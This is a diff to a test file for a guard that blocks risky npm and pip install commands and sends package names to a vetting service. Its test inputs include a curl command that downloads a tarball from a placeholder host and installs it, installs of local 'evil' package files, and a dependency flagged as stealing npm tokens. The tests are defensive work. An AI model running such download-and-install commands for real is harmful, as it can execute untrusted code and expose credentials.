@@ -173,14 +173,14 @@ const answer = (verdict: string, results: object[] = [], manifests: object[] = [
 const result = (name: string, verdict: string, reason = "r") => ({ ecosystem: "npm", name, requested: "", version: "1.0.0", verdict, reason, cached: false });
 
 /** A fake service that records what it was sent and replies with `reply` (or throws it, if it's an Error). */
-function service(reply: unknown) {
+function service(reply: unknown, files: Record<string, string> = {}) {
   const calls: Array<{ url: string; body: any }> = [];
   const post: Post = async (url, body) => {
     calls.push({ url, body });
     if (reply instanceof Error) throw reply;
     return reply;
   };
-  return { calls, env: { ...env(), post } };
+  return { calls, env: { ...env(files), post } };
 }
 
 test("an allow from the service lets the install run, and only package names and versions are sent", async () => {
@@ -250,7 +250,38 @@ test("git and URL installs are blocked without asking the service", async () => 
   const s = service(answer("allow"));
   const d = await decide(bash("npm install user/repo"), withService(), s.env);
   assert.equal(d.exitCode, 2);
-  assert.match(d.message!, /git repo or URL/);
+  assert.match(d.message!, /git repo, a URL or a package file/);
+  assert.equal(s.calls.length, 0);
+});
+
+test("package files are blocked like URLs: a downloaded .tgz isn't the user's own code", async () => {
+  const s = service(answer("allow"), { "/tmp/project/package.json": JSON.stringify({ dependencies: { evil: "file:vendor/evil-1.0.0.tgz" } }) });
+  for (const cmd of ["npm install ./evil-1.0.0.tgz", "curl -sLo /tmp/x.tgz https://x.example/x.tgz && npm i /tmp/x.tgz", "pip install ./evil-1.0-py3-none-any.whl", "npm install"]) {
+    const d = await decide(bash(cmd), withService(), s.env);
+    assert.equal(d.exitCode, 2, cmd);
+    assert.match(d.message!, /package file/, cmd);
+  }
+  assert.equal(s.calls.length, 0);
+});
+
+test("a whole-project install sends the project's direct dependencies to be checked", async () => {
+  const files = { "/tmp/project/package.json": JSON.stringify({ dependencies: { express: "^4.19.0", "ci-build-cache-helper": "^1.0.0" }, devDependencies: { local: "file:../local" } }) };
+  const s = service(answer("block", [result("ci-build-cache-helper", "block", "steals your npm token")]), files);
+  const d = await decide(bash("npm install"), withService(), s.env);
+  assert.deepEqual(s.calls[0].body.packages, [
+    { ecosystem: "npm", name: "express", version: "^4.19.0" },
+    { ecosystem: "npm", name: "ci-build-cache-helper", version: "^1.0.0" },
+  ]);
+  assert.equal(d.exitCode, 2);
+  assert.match(d.message!, /ci-build-cache-helper.*steals your npm token/);
+});
+
+test("too many packages for one check are blocked without asking the service", async () => {
+  const deps = Object.fromEntries(Array.from({ length: 201 }, (_, i) => [`pkg-${i}`, "1.0.0"]));
+  const s = service(answer("allow"), { "/tmp/project/package.json": JSON.stringify({ dependencies: deps }) });
+  const d = await decide(bash("npm ci"), withService(), s.env);
+  assert.equal(d.exitCode, 2);
+  assert.match(d.message!, /201 packages/);
   assert.equal(s.calls.length, 0);
 });
 
